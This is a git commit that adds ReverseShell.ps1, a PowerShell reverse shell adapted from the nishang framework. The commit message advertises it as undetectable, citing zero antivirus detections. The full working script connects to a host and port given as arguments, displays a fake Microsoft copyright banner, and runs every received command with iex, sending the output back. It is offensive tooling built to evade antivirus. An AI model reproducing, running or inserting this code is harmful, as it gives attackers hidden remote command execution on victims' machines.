00e1a5d64b48a3fd13830292ebdf497bfa20b8b6
Norbert Tihanyi, Phd <62064939+tihanyin@users.noreply.github.com>
2021-10-08 21:39:53 +0400

    Create ReverseShell.ps1
    My new currently undetectable Powershell Reverse Shell based on the original nishang Framework written by @nikhil_mitt.
    
    AV ratio: 0/57 (9th October 2021)

---
+++ ReverseShell.ps1
@@ -0,0 +1,16 @@
+#Twitter: @TihanyiNorbert  (No AV detecetion 2021 october)
+$c = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
+$I = $c.GetStream();
+[byte[]]$U = 0..(2-shl15)|%{0};
+$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
+$I.Write($U,0,$U.Length)
+$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$I.Write($U,0,$U.Length)
+while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
+$a = (iex $D 2>&1 | Out-String );
+$r  = $a + (pwd).Path + '> ';
+$m = ([text.encoding]::ASCII).GetBytes($r);
+$I.Write($m,0,$m.Length);
+$I.Flush()};
+$c.Close()
+
